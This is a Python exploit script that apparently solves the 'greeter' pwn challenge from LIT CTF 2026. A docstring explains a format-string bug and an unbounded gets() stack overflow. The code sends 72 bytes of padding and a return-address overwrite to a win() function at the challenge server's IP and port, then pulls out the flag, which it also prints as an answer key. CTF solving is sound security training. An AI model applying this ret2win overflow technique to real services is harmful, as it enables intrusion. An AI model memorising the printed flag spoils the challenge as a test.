#!/usr/bin/env python3
"""
LIT CTF 2026 — pwn — "greeter"   (nc 136.115.87.65 31780)

main() -> greet() -> greet2().

  greet()  : printf("whats your name? "); fgets(name,0x40,stdin); printf(name)
             (a bounded format-string bug -- the "intended" path, per the flag text)
  greet2() : printf("hows your day? "); gets(buf)   <-- UNBOUNDED, buf is [rbp-0x40]

greet2's gets() is a textbook stack overflow. buf is 0x40 bytes below rbp, so:
    padding = 0x40 (buffer) + 8 (saved rbp) = 72, then overwrite return -> win.

win() (0x401236, non-PIE) fopen/fgets/fputs's flag.txt.

  LITCTF{y3t-4N0tH3r-gEn3r1C-f0rM4T-sTR1nG}
"""
import socket, time, struct, re

HOST, PORT = "136.115.87.65", 31780
WIN = 0x401236

def main():
    payload = b"A" * 72 + struct.pack("<Q", WIN)
    s = socket.socket(); s.settimeout(6); s.connect((HOST, PORT))
    time.sleep(0.4); s.sendall(b"hi\n")            # greet(): name
    time.sleep(0.3); s.sendall(payload + b"\n")    # greet2(): overflow
    time.sleep(1.0)
    out = b""
    while True:
        try:
            c = s.recv(4096)
            if not c: break
            out += c
        except socket.timeout:
            break
    print(out.decode("latin1"))
    m = re.search(rb"LITCTF\{[^}]*\}", out)
    print("[+]", m.group().decode() if m else "no flag")

if __name__ == "__main__":
    main()
